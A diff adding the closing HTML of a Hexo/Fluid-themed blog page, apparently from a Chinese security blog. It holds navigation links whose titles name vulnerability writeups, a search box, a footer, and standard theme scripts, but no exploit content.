+                        <span class="hidden-mobile">数字经济云安全公测大赛Inject4fun题解 </span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/09/11/seacms-9-92%E5%89%8D%E5%8F%B0getshell/">
+                        <span class="hidden-mobile">seacms&#x3C;&#x3D;9.92前台getshell</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Cmsms_2.2.9前台sql注入(复现)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
